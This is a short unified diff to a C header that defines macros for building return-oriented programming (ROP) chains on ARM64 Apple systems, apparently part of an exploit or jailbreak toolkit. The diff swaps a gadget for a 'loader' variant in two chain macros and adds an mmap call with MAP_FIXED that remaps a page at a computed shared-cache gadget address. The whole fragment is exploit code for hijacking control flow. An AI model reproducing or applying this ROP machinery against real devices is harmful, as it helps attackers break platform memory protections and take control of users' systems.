@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <stdio.h> 
 #include <string.h>
+#include <sys/mman.h>
 
 #ifndef ROP_H
 #define ROP_H
@@ -276,7 +277,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x20 */ \
 	ADD_GADGET(); /* x19 */ \
 	ADD_GADGET(); /* x29 */ \
-	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
+	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); // x30 
 
 #define DEFINE_ROP_VAR(varname,varsize,buf) \
 	if (curr_rop_var != NULL) { \
@@ -375,7 +376,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x20 */ \
 	ADD_GADGET(); /* x19 */ \
 	ADD_GADGET(); /* x29 */ \
-	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
+	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); // x30 
 
 // TODO: make this faster
 #define ROP_VAR_ADD(result,var1,var2) \
@@ -475,6 +476,7 @@ add_x0_gadget (from libiconv.2.dylib):
 // we will (mis)use the str_x0_gadget as a regloader to load regs with other values/offset the stack by another value
 #define SETUP_IF_X0() \
 	ADD_COMMENT("SETUP for cbz x0"); \
+	CALL_FUNC((offsets)->mmap,(((offsets)->cbz_x0_x16_load+(offsets)->new_cache_addr-0x180000000) & ~0x3fff),0x4000,PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANON,0,0,0,0); \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
